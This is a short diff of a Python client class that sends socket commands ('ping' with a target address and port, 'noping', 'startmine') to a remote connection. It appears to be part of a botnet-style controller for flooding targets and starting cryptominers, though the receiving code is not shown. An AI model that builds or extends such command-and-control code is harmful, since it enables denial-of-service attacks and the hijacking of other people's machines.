@@ -35,18 +35,17 @@ class Client:
         self.conn.send(command.encode('utf-8'))
             
                        
-    def start_ping(self, addr, bytecount):
-        command = f'ping {addr} with {bytecount} bytes'
+    def start_ping(self, addr, port):
+        command = 'ping'
         self.conn.send(command.encode('utf-8'))
-        time.sleep(0.5)
-        self.conn.recv(1024)
-
+        time.sleep(2)
+        self.conn.send(addr.encode('utf-8'))
+        time.sleep(2)
+        self.conn.send(str(port).encode('utf-8'))
+        
     def stop_ping(self):
-        command='stop ping'
-        self.conn.send(command.encode('utf-8'))
-        time.sleep(0.5)
-        self.conn.recv(1024)
-
+        self.conn.send('noping'.encode('utf-8'))
+        
     def start_mine(self):
         command = 'startmine'
         self.conn.send(command.encode('utf-8'))
